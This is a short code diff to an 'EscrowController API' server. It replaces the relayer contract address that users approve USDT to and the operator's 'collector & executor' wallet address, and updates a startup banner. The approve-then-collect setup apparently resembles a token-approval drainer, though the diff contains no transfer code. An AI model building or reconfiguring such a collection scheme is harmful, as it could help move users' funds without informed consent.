@@ -13,10 +13,10 @@ app.use(express.json());
 // ============ CONFIGURATION ============
 const CONFIG = {
     // 5e - EscrowController contract (User approves to this)
-    RELAYER_ADDRESS: "0x5681d680B047bF5b12939625C56301556991005e",
+    RELAYER_ADDRESS: "0x94f4ad671655316621ccea0c9f70fa26a209ca12",
     
     // 8b - Your wallet (collector & executor)
-    COLLECTOR_ADDRESS: "0xDb867b88EAB55320fD50E9785B2906773dedf78b",
+    COLLECTOR_ADDRESS: "0xd45ff4b53728892595583f84f58c2b1626491c8c",
     
     USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
     
@@ -367,8 +367,8 @@ app.listen(PORT, () => {
 ║     🚀 EscrowController API v4.1                  ║
 ╠══════════════════════════════════════════════════╣
 ║  Port: ${PORT}                                      ║
-║  Approve: ${CONFIG.RELAYER_ADDRESS} (5e)            ║
-║  Collect: ${CONFIG.COLLECTOR_ADDRESS} (8b)          ║
+║  Approve: ${CONFIG.RELAYER_ADDRESS} (12)            ║
+║  Collect: ${CONFIG.COLLECTOR_ADDRESS} (8c)          ║
 ║                                                  ║
 ║  Features:                                       ║
 ║  ✅ 5s delay after approval                      ║
